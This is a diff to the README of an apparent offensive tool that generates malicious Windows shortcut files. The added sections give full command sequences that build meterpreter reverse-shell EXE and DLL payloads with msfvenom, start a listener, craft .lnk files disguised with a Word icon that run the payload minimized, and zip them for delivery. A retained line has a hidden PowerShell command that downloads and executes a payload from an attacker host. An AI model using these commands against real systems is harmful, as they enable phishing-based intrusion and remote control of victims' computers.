@@ -50,7 +50,31 @@ Flags:
 
 #### Windows
 
-Generate the shell link while hosting a webserver to stage a PowerShell (`.ps1`) payload to trigger it. For a custom icon (`--icon`) you must either specify an index or an absolute path of the file/executable with a suffix of zero (e.g., `C:\path\to\file,0`) otherwise it won't generate and result an error. The working directory (`--workingdirectory`) will be executed if you placed a dropper that touches the disk unless you're staging it so be careful with this option.
+Generate the shell link then pack it with the PE EXEcutable dropper (`.exe`) payload to trigger it. For a custom icon (`--icon`) you must either specify an index or an absolute path of the file/executable with a suffix of zero (e.g., `C:\path\to\file,0`) otherwise it won't generate and result an error. The working directory (`--workingdirectory`) will be executed if you placed a dropper that touches the disk unless you're staging it so be careful with this option.
+
+```
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f exe -o payload.exe
+
+$ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 443; run"
+
+$ shortcutgen -p lnk -c "C:\Windows\System32\cmd.exe" -a "/c .\payload.exe" --icon "C:\Program Files\Microsoft Office\root\Office16\winword.exe,0" -w "minimized" --workingdirectory "C:\\Users\\Public\\" -o payload.lnk
+
+$ 7z a -tzip -mx=9 archive.zip payload.*
+```
+
+Generate the shell link then pack it with the Dynamic Link Library dropper (`.dll`) payload to trigger it.
+
+```
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f dll -o payload.dll
+
+$ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 443; run"
+
+$ shortcutgen -p lnk -c "C:\Windows\System32\cmd.exe" -a "/c rundll32.exe .\payload.dll,StartW" --icon "C:\Program Files\Microsoft Office\root\Office16\winword.exe,0" -w "minimized" --workingdirectory "C:\\Users\\Public\\" -o payload.lnk
+
+$ 7z a -tzip -mx=9 archive.zip payload.*
+```
+
+Generate the shell link while hosting a webserver to stage a PowerShell (`.ps1`) payload to trigger it.
 
 ```
 $ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f psh-reflection -o payload.ps1
@@ -59,7 +83,7 @@ $ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterp
 
 $ sudo python -m http.server 80
 
-$ shortcutgen -p lnk -c "powershell.exe" -a "-nop -NonI -Nologo -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http[s]://<attacker_IP>/payload.ps1'))\"" --icon "C:\Program Files\Microsoft Office\root\Office16\winword.exe,0" -w "minimized" --workingdirectory "C:\\Users\\Public\\" -o payload.lnk
+$ shortcutgen -p lnk -c ""C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe"" -a "-nop -NonI -Nologo -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http[s]://<attacker_IP>/payload.ps1'))\"" --icon "C:\Program Files\Microsoft Office\root\Office16\winword.exe,0" -w "minimized" --workingdirectory "C:\\Users\\Public\\" -o payload.lnk
 ```
 
 Generate the shell link while hosting a webserver to stage a MSI installer (`.msi`) payload to trigger it.
